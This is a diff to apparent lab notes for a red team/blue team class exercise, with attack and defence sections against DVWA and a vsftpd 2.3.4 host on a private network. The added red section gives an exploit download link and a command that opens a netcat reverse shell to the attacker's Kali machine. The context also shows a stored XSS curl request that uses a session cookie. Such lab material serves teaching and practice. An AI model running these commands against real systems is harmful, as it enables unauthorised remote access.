@@ -1,5 +1,7 @@
+https://raw.githubusercontent.com/syedmuhammadhussamasifnaqvi/cyberproject/main/command.txt
+
 -------------------------------------------------------------------
-ATTACK (RED)
+RED - ATTACK (Stored XSS)
 -------------------------------------------------------------------
 Remove rule from the firewall
 
@@ -24,7 +26,7 @@ Attacker user his machine to add a comment using cookie
     curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
 
 -------------------------------------------------------------------
-DEFEND (BLUE)
+BLUE - DEFEND
 -------------------------------------------------------------------
 In DMZ interface, remove all extra "LANDM Categories"
 
@@ -49,5 +51,12 @@ Reverse Shell Rule(s):
 
 
 -------------------------------------------------------------------
+RED - ATTACK (Reverse Shell)
+-------------------------------------------------------------------
+
+https://github.com/ahervias77/vsftpd-2.3.4-exploit/archive/refs/heads/master.zip
+
+python3 vsftpd_234_exploit.py <Target IP> 21 “netcat -nv <Kali IP address> 4444 -e /bin/bash”
+
+-------------------------------------------------------------------
  
-https://raw.githubusercontent.com/syedmuhammadhussamasifnaqvi/cyberproject/main/command.txt
